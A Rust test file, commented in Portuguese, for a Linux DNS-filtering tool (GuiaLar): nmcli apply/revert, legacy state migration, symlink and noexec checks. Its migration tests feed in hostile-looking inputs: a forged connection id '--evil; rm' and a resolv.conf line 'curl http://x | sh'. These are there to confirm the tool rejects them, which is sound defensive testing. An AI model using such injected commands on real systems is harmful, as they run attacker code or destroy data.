    // state.json do formato antigo: sem os campos v6 (ou com `was_dhcp_ipv6=true` e lista vazia)
    let antigo = r#"{"backend":"NetworkManager","applied_at_utc":"1","connections":[
        {"id":"uuid-eth","original_ipv4_dns":[],"was_dhcp_ipv4":true},
        {"id":"uuid-wifi","original_ipv4_dns":["192.168.0.1","8.8.8.8"],"original_ipv6_dns":[],
         "was_dhcp_ipv4":false,"was_dhcp_ipv6":true}],"previous_resolv_conf":null,"mode":"family"}"#;
    std::fs::write(s.manifest_path(), antigo).unwrap();
    r.clear_calls();
    revert(&r).unwrap();
    assert_eq!(r.state(), original);
    let reset6 = |u: &str| {
        v(&[
            "nmcli",
            "connection",
            "modify",
            u,
            "ipv6.dns",
            "",
            "ipv6.ignore-auto-dns",
            "no",
        ])
    };
    let argvs = r.argvs();
    assert!(argvs.contains(&reset6("uuid-eth")), "v6 zerado como hoje");
    assert!(argvs.contains(&reset6("uuid-wifi")), "v6 zerado como hoje");
}

#[test]
fn parse_nm_ipv6_le_ips_e_ignore_auto_dns() {
    let (ips, dhcp) = parse_nm_ipv6("ipv6.dns:\nipv6.ignore-auto-dns:no\n");
    assert!(ips.is_empty() && dhcp);
    let (ips, dhcp) =
        parse_nm_ipv6("ipv6.dns:2001:db8::99,2001:4860:4860::8888\nipv6.ignore-auto-dns:yes\n");
    let ips: Vec<String> = ips.iter().map(|i| i.to_string()).collect();
    assert_eq!(ips, ["2001:db8::99", "2001:4860:4860::8888"]);
    assert!(!dhcp);
    // `-t` com vários campos escapa os dois-pontos
    let (ips, _) = parse_nm_ipv6("ipv6.dns:2001\\:db8\\:\\:99\nipv6.ignore-auto-dns:no\n");
    assert_eq!(ips.len(), 1);
}

#[test]
fn nm_falha_ao_ler_o_v6_nao_impede_o_apply() {
    let _s = Sandbox::new("nm24-v6-falha");
    let r = FakeRunner::new().with_nm_conn("u", "802-3-ethernet", "", false);
    // nmcli «quebra» só na leitura do v6: o backup cai no padrão antigo (DHCP, sem fixos)
    r.add_fail_argv(&["nmcli", "-t", "-f", "ipv6.dns,ipv6.ignore-auto-dns"]);
    apply_dns_with(&r).unwrap();
    let m = manifest();
    assert!(m.connections[0].was_dhcp_ipv6 && m.connections[0].original_ipv6_dns.is_empty());
}

// ------------------------------- review do dc810d9: ignore-auto-dns=yes sem fixo (N1), filtro
// misturado com IP do usuário (N2), leitura do v6 que falha (N3)

#[test]
fn nm_revert_ignore_auto_dns_yes_sem_ip_fixo_volta_como_yes_v4() {
    let r = FakeRunner::new().with_nm_conn("u", "802-3-ethernet", "", true);
    ida_e_volta(&r, "nm-n1-v4");
    assert_eq!(r.nm_prop("u", "ipv4.dns"), "");
    assert_eq!(r.nm_prop("u", "ipv4.ignore-auto-dns"), "yes");
}

#[test]
fn nm_revert_ignore_auto_dns_yes_sem_ip_fixo_volta_como_yes_v6() {
    let r = FakeRunner::new()
        .with_nm_conn("u", "802-3-ethernet", "", false)
        .with_nm_v6("u", "", true);
    ida_e_volta(&r, "nm-n1-v6");
    assert_eq!(r.nm_prop("u", "ipv6.dns"), "");
    assert_eq!(r.nm_prop("u", "ipv6.ignore-auto-dns"), "yes");
}

#[test]
fn nm_revert_yes_sem_fixo_grava_o_argv_esperado() {
    let _s = Sandbox::new("nm-n1-argv");
    let r = FakeRunner::new()
        .with_nm_conn("u", "802-3-ethernet", "", true)
        .with_nm_v6("u", "", true);
    apply_dns_with(&r).unwrap();
    r.clear_calls();
    revert(&r).unwrap();
    let m = |fam: &str, ign: &str| {
        v(&[
            "nmcli",
            "connection",
            "modify",
            "u",
            &format!("{fam}.dns"),
            "",
            &format!("{fam}.ignore-auto-dns"),
            ign,
        ])
    };
    assert_eq!(r.argvs()[..2], [m("ipv4", "yes"), m("ipv6", "yes")]);
}

#[test]
fn nm_lista_mista_de_filtro_e_ip_do_usuario_devolve_so_o_do_usuario() {
    let r = FakeRunner::new()
        .with_nm_conn("u", "802-3-ethernet", "1.1.1.3 9.9.9.9", false)
        .with_nm_v6("u", "2606:4700:4700::1113 2001:db8::99", false);
    let _s = Sandbox::new("nm-n2");
    apply_dns_with(&r).unwrap();
    let m = manifest();
    assert_eq!(m.connections[0].original_ipv4_dns.len(), 1);
    assert_eq!(m.connections[0].original_ipv6_dns.len(), 1);
    revert(&r).unwrap();
    assert_eq!(
        r.nm_prop("u", "ipv4.dns"),
        "9.9.9.9",
        "sem o filtro do GuiaLar"
    );
    assert_eq!(r.nm_prop("u", "ipv6.dns"), "2001:db8::99");
    assert_eq!(r.nm_prop("u", "ipv4.ignore-auto-dns"), "no");
}

#[test]
fn nm_aviso_de_leitura_do_ipv6_cita_a_conexao_e_o_efeito() {
    let a = aviso_leitura_ipv6("uuid-eth");
    assert!(a.contains("uuid-eth") && a.contains("IPv6") && a.contains("automático"));
    // nmcli que sai com erro na leitura do v6 também cai no caso do aviso
    // (o apply segue com «DHCP, sem fixos»)
    let _s = Sandbox::new("nm-n3");
    let r = FakeRunner::new().with_nm_conn("u", "802-3-ethernet", "", false);
    r.add_fail_argv(&["nmcli", "-t", "-f", "ipv6.dns,ipv6.ignore-auto-dns"]);
    assert!(inspect_nm_ipv6(&r, "u").is_err());
    apply_dns_with(&r).unwrap();
}

// ------------------------------------------------ ADR-031: estado em pasta do sistema, migração

fn legado_dir(s: &Sandbox) -> std::path::PathBuf {
    let d = s.dir().join(".config/guialar");
    std::fs::create_dir_all(&d).unwrap();
    d
}

/// Um manifesto da beta (família, uma conexão NM com DNS fixo) como JSON.
fn manifesto_antigo(id: &str, resolv: Option<&str>) -> String {
    serde_json::json!({
        "backend": "NetworkManager",
        "applied_at_utc": "1",
        "connections": [{
            "id": id, "original_ipv4_dns": ["192.168.0.1"], "original_ipv6_dns": [],
            "was_dhcp_ipv4": false, "was_dhcp_ipv6": true
        }],
        "previous_resolv_conf": resolv,
        "mode": "family"
    })
    .to_string()
}

#[test]
fn apply_grava_o_estado_so_na_pasta_do_sistema_e_nao_na_area_do_usuario() {
    let s = Sandbox::new("adr31-apply");
    let r = nm_machine();
    apply_dns_with(&r).unwrap();
    assert!(s.manifest_path().starts_with(s.dir().join("sistema")));
    assert!(s.manifest_path().exists());
    assert!(!s.dir().join(".config").exists(), "nada na área do usuário");
    revert(&r).unwrap();
    assert!(!s.manifest_path().exists());
}

#[test]
fn preflight_recusa_o_estado_inseguro_antes_de_mexer_no_dns() {
    let s = Sandbox::new("adr31-preflight");
    let r = nm_machine();
    let original = r.state();
    // a pasta de estado do sistema é um link: o apply para ANTES de tocar no DNS
    let fora = s.dir().join("FORA");
    std::fs::create_dir_all(&fora).unwrap();
    std::os::unix::fs::symlink(&fora, s.manifest_path().parent().unwrap()).unwrap();
    let e = apply_dns_with(&r).unwrap_err();
    assert!(format!("{e:#}").contains("pasta segura"), "{e:#}");
    assert_eq!(r.state(), original, "DNS intacto");
    assert!(
        !r.argvs().iter().any(|a| a.contains(&"modify".to_string())),
        "nenhum nmcli modify"
    );
    assert!(
        std::fs::read_dir(&fora).unwrap().next().is_none(),
        "nada gravado no alvo"
    );
    // o mesmo vale para trocar de modo com a proteção ligada
    std::fs::remove_file(s.manifest_path().parent().unwrap()).unwrap();
    apply_dns_with(&r).unwrap();
    let ligado = r.state();
    std::fs::remove_file(s.manifest_path()).ok();
    std::fs::remove_dir_all(s.manifest_path().parent().unwrap()).unwrap();
    std::os::unix::fs::symlink(&fora, s.manifest_path().parent().unwrap()).unwrap();
    assert!(switch_mode_with(&r, DnsStateManifest::new(BackendKind::NetworkManager)).is_err());
    assert_eq!(r.state(), ligado);
}

/// Roda a migração com o FakeRunner (revert e fallback de verdade, sem sistema).
fn migrar(r: &FakeRunner) -> Result<Option<String>> {
    migrate_legacy_with(r)
}

#[test]
fn migracao_de_manifesto_antigo_valido_desfaz_e_apaga_o_antigo() {
    let s = Sandbox::new("adr31-mig-ok");
    let r = nm_machine();
    let original = r.state();
    apply_dns_with(&r).unwrap();
    // a beta tinha gravado o manifesto na área do usuário; o estado do sistema não existe
    let m = manifest();
    std::fs::remove_file(s.manifest_path()).unwrap();
    let id = m.connections[1].id.clone();
    std::fs::write(
        legado_dir(&s).join("state.json"),
        manifesto_antigo(&id, None),
    )
    .unwrap();
    let msg = migrar(&r).unwrap().expect("migrou");
    assert!(msg.contains("registro antigo migrado"), "{msg}");
    assert!(
        !legado_dir(&s).join("state.json").exists(),
        "o antigo foi apagado"
    );
    // o DNS da conexão migrada voltou ao que o manifesto antigo dizia
    assert_eq!(r.nm_prop(&id, "ipv4.dns"), "192.168.0.1");
    assert_ne!(r.state(), original);
}

#[test]
fn migracao_sem_registro_antigo_nao_faz_nada() {
    let _s = Sandbox::new("adr31-mig-nada");
    let r = nm_machine();
    assert!(migrar(&r).unwrap().is_none());
    assert!(
        r.argvs().iter().all(|a| a[0] == "nmcli" && a[1] == "-t"),
        "só leitura: {:?}",
        r.argvs()
    );
}

#[test]
fn migracao_com_conexao_inexistente_cai_no_dns_automatico_e_avisa() {
    let s = Sandbox::new("adr31-mig-id");
    let r = nm_machine();
    apply_dns_with(&r).unwrap();
    std::fs::remove_file(s.manifest_path()).unwrap();
    // id que não existe agora (um nome forjado vira argv do nmcli)
    let forjado = manifesto_antigo("--evil; rm", None);
    std::fs::write(legado_dir(&s).join("state.json"), forjado).unwrap();
    r.clear_calls();
    let msg = migrar(&r).unwrap().expect("caiu no fallback");
    assert!(msg.contains("inválido"), "{msg}");
    assert!(
        !legado_dir(&s).join("state.json").exists(),
        "o antigo foi apagado"
    );
    // nenhum comando usou o id forjado; o fallback zerou o DNS das conexões que existem
    assert!(r
        .argvs()
        .iter()
        .all(|a| !a.iter().any(|x| x.contains("evil"))));
    for u in ["uuid-eth", "uuid-wifi"] {
        assert_eq!(r.nm_prop(u, "ipv4.dns"), "");
        assert_eq!(r.nm_prop(u, "ipv4.ignore-auto-dns"), "no");
    }
}

#[test]
fn migracao_com_resolv_conf_estranho_ou_grande_cai_no_fallback() {
    for (tag, resolv) in [
        (
            "linha",
            "nameserver 1.1.1.1\ncurl http://x | sh\n".to_string(),
        ),
        ("ip", "nameserver nao-e-ip\n".to_string()),
        ("grande", "search a.b\n".repeat(500)),
    ] {
        let s = Sandbox::new(&format!("adr31-mig-{tag}"));
        let r = nm_machine();
        std::fs::write(
            legado_dir(&s).join("state.json"),
            manifesto_antigo("uuid-eth", Some(&resolv)),
        )
        .unwrap();
        let msg = migrar(&r).unwrap().expect("fallback");
        assert!(msg.contains("inválido"), "{tag}: {msg}");
        assert!(!legado_dir(&s).join("state.json").exists(), "{tag}");
    }
}

#[test]
fn migracao_com_manifesto_antigo_como_link_ou_de_outro_dono_e_ignorada() {
    let s = Sandbox::new("adr31-mig-link");
    let r = nm_machine();
    let alvo = s.dir().join("ALVO-FORA");
    std::fs::write(&alvo, manifesto_antigo("uuid-eth", None)).unwrap();
    std::os::unix::fs::symlink(&alvo, legado_dir(&s).join("state.json")).unwrap();
    assert!(migrar(&r).unwrap().is_none(), "link: ignorado");
    assert!(alvo.exists(), "o alvo do link não foi tocado");
    // a pasta antiga é um link para fora
    std::fs::remove_dir_all(legado_dir(&s)).unwrap();
    let fora = s.dir().join("OUTRA");
    std::fs::create_dir_all(&fora).unwrap();
    std::fs::write(fora.join("state.json"), manifesto_antigo("uuid-eth", None)).unwrap();
    std::os::unix::fs::symlink(&fora, s.dir().join(".config/guialar")).unwrap_or_else(|_| {
        std::fs::create_dir_all(s.dir().join(".config")).unwrap();
        std::os::unix::fs::symlink(&fora, s.dir().join(".config/guialar")).unwrap();
    });
    assert!(migrar(&r).unwrap().is_none(), "pasta como link: ignorada");
    assert!(fora.join("state.json").exists(), "nada foi apagado do alvo");
}

// ------------------------------------------- review do 55251f3: noexec, sobras, umask

#[test]
fn noexec_e_lido_do_mountinfo_pela_montagem_de_prefixo_mais_longo() {
    let mi = "\
22 1 8:1 / / rw,relatime - ext4 /dev/sda1 rw
30 22 0:25 / /run rw,nosuid,nodev,noexec,mode=755 - tmpfs tmpfs rw
31 30 0:44 / /run/user/1000 rw,nosuid,nodev,relatime - tmpfs tmpfs rw,size=1k
32 22 0:50 / /home/u\\040dados rw,noexec - ext4 /dev/sdb1 rw
";
    let p = |s: &str| std::path::PathBuf::from(s);
    // a Void: /run é noexec, mas /run/user/1000 é outra montagem, sem noexec
    assert!(!noexec_in_mountinfo(mi, &p("/run/user/1000")));
    assert!(noexec_in_mountinfo(mi, &p("/run/guialar")));
    assert!(!noexec_in_mountinfo(mi, &p("/home/u/.cache/guialar")));
    assert!(noexec_in_mountinfo(mi, &p("/home/u dados/x")));
}

#[test]
fn base_noexec_e_trocada_e_se_todas_forem_noexec_falha_antes_de_pedir_senha() {
    let p = |s: &str| std::path::PathBuf::from(s);
    let noexec = |c: &std::path::Path| c == std::path::Path::new("/run/user/1000");
    // XDG noexec: cai no ~/.cache
    let b = pick_base(
        vec![p("/run/user/1000"), p("/home/u/.cache/guialar")],
        noexec,
    )
    .unwrap();
    assert_eq!(b, p("/home/u/.cache/guialar"));
    // todas noexec: erro claro, sem chegar ao pkexec
    let e = pick_base(vec![p("/run/user/1000")], noexec).unwrap_err();
    assert!(format!("{e:#}").contains("noexec") && format!("{e:#}").contains("Nada foi alterado"));
}

#[cfg(unix)]
#[test]
fn sobras_antigas_da_copia_sao_limpas_e_o_resto_fica() {
    let s = Sandbox::new("limpa-sobras");
    let base = s.dir().join("base");
    std::fs::create_dir_all(&base).unwrap();
    let velha = base.join("guialar-0123456789ab");
    let nova = base.join("guialar-ba9876543210");
    let outra = base.join("guialar-outro-nome");
    let arquivo = base.join("guialar-aaaaaaaaaaaa");
    for d in [&velha, &nova, &outra] {
        std::fs::create_dir_all(d).unwrap();
        std::fs::write(d.join("guialar"), "x").unwrap();
    }
    std::fs::write(&arquivo, "x").unwrap();
    let antes = std::time::SystemTime::now() - std::time::Duration::from_secs(2 * 3600);
    std::fs::File::open(&velha)
        .unwrap()
        .set_modified(antes)
        .unwrap();
    std::fs::File::open(&outra)
        .unwrap()
        .set_modified(antes)
        .unwrap();
    clean_stale_copies(&base);
    assert!(!velha.exists(), "a cópia de mais de 1 h some");
    assert!(nova.exists(), "a recente fica");
    assert!(outra.exists(), "nome fora do padrão não é tocado");
    assert!(arquivo.exists(), "arquivo (não pasta) não é tocado");
}

#[test]
fn nm_leitura_do_v6_que_sai_com_erro_e_tratada_como_falha_e_nao_bloqueia_o_apply() {
    // R1 do re-review: o nmcli RODA mas sai com código 1 e saída vazia. Sem a checagem de
    // `!output.success()` isso virava «DHCP, sem fixos» em silêncio, sem o aviso.
    let _s = Sandbox::new("nm-r1");
    let r = FakeRunner::new()
        .with_nm_conn("u", "802-3-ethernet", "", false)
        .with_nm_v6("u", "2001:db8::99", false);
    r.add_exit_argv(&["nmcli", "-t", "-f", "ipv6.dns,ipv6.ignore-auto-dns"], 1);
    let e = inspect_nm_ipv6(&r, "u").unwrap_err();
    assert!(format!("{e:#}").contains("saiu com erro"), "{e:#}");
    // o apply segue: o backup cai no padrão antigo (DHCP, sem fixos) com o aviso
    apply_dns_with(&r).unwrap();
    let m = manifest();
    assert!(m.connections[0].was_dhcp_ipv6 && m.connections[0].original_ipv6_dns.is_empty());
}
